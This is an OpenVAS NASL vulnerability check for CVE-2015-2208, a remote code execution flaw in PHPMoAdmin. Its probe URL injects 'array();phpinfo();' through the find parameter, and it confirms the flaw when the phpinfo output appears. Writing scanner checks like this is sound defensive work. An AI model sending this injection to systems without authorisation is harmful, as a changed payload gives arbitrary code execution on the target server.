###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phpmoadmin_rce_03_15.nasl 11396 2018-09-14 16:36:30Z cfischer $
#
# PHPMoAdmin Unauthorized Remote Code Execution
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105230");
  script_cve_id("CVE-2015-2208");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("$Revision: 11396 $");
  script_name("PHPMoAdmin Unauthorized Remote Code Execution");
  script_tag(name:"last_modification", value:"$Date: 2018-09-14 18:36:30 +0200 (Fri, 14 Sep 2018) $");
  script_tag(name:"creation_date", value:"2015-03-04 09:46:19 +0100 (Wed, 04 Mar 2015)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/36251/");

  script_tag(name:"impact", value:"Exploiting this issue will allow attackers to execute arbitrary code
  within the context of the affected application.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"PHPMoAdmin is prone to a remote code-execution
  vulnerability because the application fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"exploit");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

files = make_list( "/moadmin.php", "/wu-moadmin.php" );

foreach dir( make_list_unique("/phpmoadmin", "/moadmin", "/wu-moadmin", cgi_dirs( port:port )) ) {

  if( dir == "/" ) dir = "";

  foreach file( files ) {

    url = dir +  file + "?db=admin&action=listRows&collection=fdsa&find=array();phpinfo();";

    if( http_vuln_check( port:port, url:url, pattern:"<title>phpinfo\(\)" ) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit(0);
    }
  }
}

exit(99);
